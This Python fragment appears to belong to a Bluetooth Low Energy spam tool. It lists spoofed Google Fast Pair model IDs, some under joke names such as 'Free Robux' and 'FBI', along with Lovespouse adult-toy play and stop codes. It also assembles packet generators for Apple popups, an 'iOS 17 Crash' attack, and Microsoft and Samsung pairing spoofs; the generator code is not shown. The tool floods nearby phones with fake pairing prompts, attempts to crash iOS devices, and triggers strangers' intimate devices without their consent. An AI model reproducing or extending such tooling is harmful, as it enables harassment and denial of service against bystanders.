FASTPAIR_DEBUG = {"D99CA1": "Flipper Zero", "77FF67": "Free Robux", "AA187F": "Free VBucks", "DCE9EA": "Rickroll", "87B25F": "Animated Rickroll", "F38C02": "Boykisser", "1448C9": "BLM", "D5AB33": "Xtreme", "0C0B67": "Xtreme Cta", "13B39D": "Talking Sasquach", "AA1FE1": "ClownMaster", "7C6CDB": "Obama", "005EF9": "Ryanair", "E2106F": "FBI", "B37A62": "Tesla"}
FASTPAIR_NON_PRODUCTION = {"000007": "Android Auto", "070000": "Android Auto 2", "00000A": "Anti-Spoof Test", "0A0000": "Anti-Spoof Test 2", "000047": "Arduino 101", "470000": "Arduino 101 2", "1E89A7": "ATS2833_EVB", "0001F0": "Bisto CSR8670 Dev Board", "01E5CE": "BLE-Phone", "000048": "Fast Pair Headphones", "480000": "Fast Pair Headphones 2", "000049": "Fast Pair Headphones 3", "490000": "Fast Pair Headphones 4", "000008": "Foocorp Foophones", "080000": "Foocorp Foophones 2", "0200F0": "Goodyear", "F00002": "Goodyear", "00000B": "Google Gphones", "0B0000": "Google Gphones 2", "0C0000": "Google Gphones 3", "001000": "LG HBS1110", "00B727": "Smart Controller 1", "00F7D4": "Smart Setup", "F00400": "T10", "00000D": "Test 00000D", "000035": "Test 000035", "350000": "Test 000035 2", "000009": "Test Android TV", "090000": "Test Android TV 2"}
LOVESPOUSE_PLAY = {"E49C6C": "Classic 1", "E7075E": "Classic 2", "E68E4F": "Classic 3", "E1313B": "Classic 4", "E0B82A": "Classic 5", "E32318": "Classic 6", "E2AA09": "Classic 7", "ED5DF1": "Classic 8", "ECD4E0": "Classic 9", "D41F5D": "Independent 1-1", "D7846F": "Independent 1-2", "D60D7E": "Independent 1-3", "D1B20A": "Independent 1-4", "D0B31B": "Independent 1-5", "D3A029": "Independent 1-6", "D22938": "Independent 1-7", "DDDEC0": "Independent 1-8", "DC57D1": "Independent 1-9", "A4982E": "Independent 2-1", "A7031C": "Independent 2-2", "A68A0D": "Independent 2-3", "A13579": "Independent 2-4", "A0BC68": "Independent 2-5", "A3275A": "Independent 2-6", "A2AE4B": "Independent 2-7", "AD59B3": "Independent 2-8", "ACD0A2": "Independent 2-9"}
LOVESPOUSE_STOP = {"E5157D": "Classic Stop", "D5964C": "Independent 1 Stop", "A5113F": "Independent 2 Stop"}


def build_categories():
    """Return an ordered list of (category_title, [Packet, ...])."""
    return [
        ("Apple - New Device", gen_apple_new_device(APPLE_NEW_DEVICE, {})),
        ("Apple - New AirTag", gen_apple_new_airtag(APPLE_NEW_AIRTAG, APPLE_NEW_AIRTAG_COLORS)),
        ("Apple - Not Your Device", gen_apple_not_your_device(APPLE_NOT_YOUR_DEVICE, APPLE_NOT_YOUR_DEVICE_COLORS)),
        ("Apple - Action Modals", gen_apple_action_modal(APPLE_ACTION_MODAL)),
        ("Apple - iOS 17 Crash", gen_apple_ios17_crash(APPLE_IOS17_CRASH)),
        ("Microsoft - Swift Pair", gen_swift_pair()),
        ("Samsung - Easy Setup Buds", gen_easy_setup_buds(SAMSUNG_BUDS)),
        ("Samsung - Easy Setup Watch", gen_easy_setup_watch(SAMSUNG_WATCH)),
        ("Android - Fast Pair Devices", _fast_pair(FASTPAIR_DEVICES)),
        ("Android - Fast Pair Phone Setup", _fast_pair(FASTPAIR_PHONE_SETUP)),
        ("Android - Fast Pair Debug", _fast_pair(FASTPAIR_DEBUG)),
        ("Android - Fast Pair Non Production", _fast_pair(FASTPAIR_NON_PRODUCTION)),
        ("Lovespouse - Play", gen_lovespouse(LOVESPOUSE_PLAY)),
        ("Lovespouse - Stop", gen_lovespouse(LOVESPOUSE_STOP)),
    ]
